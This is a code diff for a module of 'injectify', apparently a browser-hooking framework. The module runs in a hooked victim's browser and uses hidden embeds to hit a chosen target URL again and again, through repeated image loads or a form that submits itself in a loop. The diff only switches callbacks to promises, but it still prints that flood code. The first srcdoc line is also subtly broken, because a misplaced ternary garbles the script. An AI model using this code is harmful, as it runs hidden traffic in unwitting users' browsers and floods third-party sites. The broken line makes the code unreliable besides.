@@ -1,6 +1,5 @@
 import Module from '../../definitions/module'
 declare const { module, injectify } : Module
-import { Config } from './config'
 
 let request = {
   method: 'GET',
@@ -103,7 +102,7 @@ if (injectify.info.platform === 'browser') {
       injectify.module('embed', {
         interaction: false,
         hidden: true
-      }, (element) => {
+      }).then(element => {
         element.srcdoc = `<script>setInterval(function(){ let url=${JSON.stringify(target)}${request.random}` ? '+"?"++new Date()' : `; let req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },${request.interval * 4})</script>`
       })
 
@@ -164,7 +163,7 @@ if (injectify.info.platform === 'browser') {
          */
         injectify.module('embed', {
           hidden: true
-        }, (embed) => {
+        }).then(embed => {
           embed.setAttribute('srcdoc', `<body onload="document.getElementsByTagName('form')[0].submit()">${form.outerHTML}<iframe name="${frameName}" onload="if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${request.interval})}"/></body>`)
         })
       } else {
